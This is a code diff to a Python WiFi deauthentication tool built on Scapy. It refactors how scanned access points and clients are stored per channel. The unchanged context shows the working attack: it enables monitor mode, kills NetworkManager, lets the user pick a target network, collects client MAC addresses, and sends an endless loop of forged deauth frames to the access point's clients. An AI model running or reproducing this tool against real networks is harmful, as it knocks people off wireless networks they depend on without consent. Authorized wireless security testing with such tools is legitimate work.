@@ -41,8 +41,7 @@ class Interceptor:
 
         self.attack_loop_count = 0
 
-        self.target_ssid = str()
-        self._active_aps = defaultdict(dict)
+        self.target_ssid = dict()  # ssid stats
 
         if not skip_monitor_mode_setup:
             printf("[*] Setting up monitor mode...")
@@ -58,7 +57,7 @@ class Interceptor:
             if not self._kill_networkmanager():
                 printf("[!] Failed to kill NetworkManager...")
 
-        self._channel_range = self._get_channels()
+        self._channel_range = {channel: defaultdict(dict) for channel in self._get_channels()}
 
     def _enable_monitor_mode(self):
         for cmd in [f"sudo ip link set {self.interface} down",
@@ -91,8 +90,9 @@ class Interceptor:
                 ssid = pkt[Dot11Elt].info.decode().strip() or ap_mac
                 if ap_mac == self._BROADCAST_MACADDR or not ssid:
                     return
-                if ssid not in self._active_aps:
-                    self._active_aps[ssid] = self._init_ap_dict(ap_mac, self._current_channel_num)
+                if ssid not in self._channel_range[self._current_channel_num]:
+                    self._channel_range[self._current_channel_num][ssid] = \
+                        self._init_ap_dict(ap_mac, self._current_channel_num)
                     # printf(f"[+] Found {ssid} on channel {self._current_channel_num}...")
             else:
                 self._clients_sniff_cb(pkt)  # pass forward to find potential clients
@@ -110,7 +110,7 @@ class Interceptor:
         except KeyboardInterrupt:
             return
 
-    def _start_initial_ap_scan(self):
+    def _start_initial_ap_scan(self) -> dict:
         printf(f"[*] Starting AP scan, please wait... ({len(self._channel_range)} channels total)")
 
         self._scan_channels_for_aps()
@@ -118,13 +118,15 @@ class Interceptor:
         ctr = 0
         target_map = dict()
         printf(DELIM)
-        for ssid, ssid_stats in self._active_aps.items():
-            if not ssid or not ssid_stats:
-                continue
-            ctr += 1
-            target_map[ctr] = ssid
-            pref = f"[{str(ctr).rjust(3, ' ')}] "
-            printf(f"{pref}{self._generate_ssid_str(ssid, ssid_stats['channel'], ssid_stats['mac_addr'], len(pref))}")
+        for channel, all_channel_aps in self._channel_range.items():
+            for ssid, ssid_stats in all_channel_aps.items():
+                if not ssid or not ssid_stats:
+                    continue
+                ctr += 1
+                target_map[ctr] = copy.deepcopy(ssid_stats)
+                target_map[ctr]['ssid'] = ssid
+                pref = f"[{str(ctr).rjust(3, ' ')}] "
+                printf(f"{pref}{self._generate_ssid_str(ssid, ssid_stats['channel'], ssid_stats['mac_addr'], len(pref))}")
         if not target_map:
             printf("[!] Not APs were found, quitting...")
             self._abort = True
@@ -144,10 +146,10 @@ class Interceptor:
         try:
             if self._packet_confirms_client(pkt):
                 ap_mac = str(pkt.addr3)
-                if ap_mac == self._active_aps[self.target_ssid]["mac_addr"]:
+                if ap_mac == self.target_ssid["mac_addr"]:
                     c_mac = pkt.addr1
-                    if c_mac != self._BROADCAST_MACADDR and c_mac not in self._active_aps[self.target_ssid]["clients"]:
-                        self._active_aps[self.target_ssid]["clients"].append(c_mac)
+                    if c_mac != self._BROADCAST_MACADDR and c_mac not in self.target_ssid["clients"]:
+                        self.target_ssid["clients"].append(c_mac)
         except:
             pass
 
@@ -165,7 +167,7 @@ class Interceptor:
         try:
             printf(f"[*] Starting de-auth loop...")
 
-            ap_mac = self._active_aps[self.target_ssid]["mac_addr"]
+            ap_mac = self.target_ssid["mac_addr"]
 
             rd_frm = RadioTap()
             deauth_frm = Dot11Deauth(reason=7)
@@ -175,7 +177,7 @@ class Interceptor:
                       Dot11(addr1=self._BROADCAST_MACADDR, addr2=ap_mac, addr3=ap_mac) /
                       deauth_frm,
                       iface=self.interface)
-                for client_mac in self._active_aps[self.target_ssid]["clients"]:
+                for client_mac in self.target_ssid["clients"]:
                     sendp(rd_frm /
                           Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
                           deauth_frm,
@@ -192,10 +194,9 @@ class Interceptor:
 
     def run(self):
         self.target_ssid = self._start_initial_ap_scan()
-        printf(f"[*] Attacking target {self.target_ssid}")
-        printf(f"[*] Setting channel -> {self._active_aps[self.target_ssid]['channel']}")
-        self._set_channel(self._active_aps[self.target_ssid]["channel"])
-        self.target_ssid = self.target_ssid.strip()  # strip() is important for dupes only after setting the channel
+        printf(f"[*] Attacking target {self.target_ssid['ssid']}")
+        printf(f"[*] Setting channel -> {self.target_ssid['channel']}")
+        self._set_channel(self.target_ssid['channel'])
 
         for action in [self._run_deauther, self._listen_for_clients]:
             t = Thread(target=action, args=tuple(), daemon=True)
@@ -206,11 +207,11 @@ class Interceptor:
         try:
             start = self.get_time()
             while not self._abort:
-                printf(f"[*] Target SSID{self.target_ssid.rjust(80 - 15, ' ')}")
-                printf(f"[*] Channel{str(self._active_aps[self.target_ssid]['channel']).rjust(80 - 11, ' ')}")
-                printf(f"[*] MAC addr{self._active_aps[self.target_ssid]['mac_addr'].rjust(80 - 12, ' ')}")
+                printf(f"[*] Target SSID{self.target_ssid['ssid'].rjust(80 - 15, ' ')}")
+                printf(f"[*] Channel{str(self.target_ssid['channel']).rjust(80 - 11, ' ')}")
+                printf(f"[*] MAC addr{self.target_ssid['mac_addr'].rjust(80 - 12, ' ')}")
                 printf(f"[*] Net interface{self.interface.rjust(80 - 17, ' ')}")
-                printf(f"[*] Confirmed clients{str(len(self._active_aps[self.target_ssid]['clients'])).rjust(80 - 21, ' ')}")
+                printf(f"[*] Confirmed clients{str(len(self.target_ssid['clients'])).rjust(80 - 21, ' ')}")
                 printf(f"[*] Elapsed sec {str(self.get_time() - start).rjust(80 - 16, ' ')}")
                 sleep(self._printf_res_intv)
                 clear_line(7)
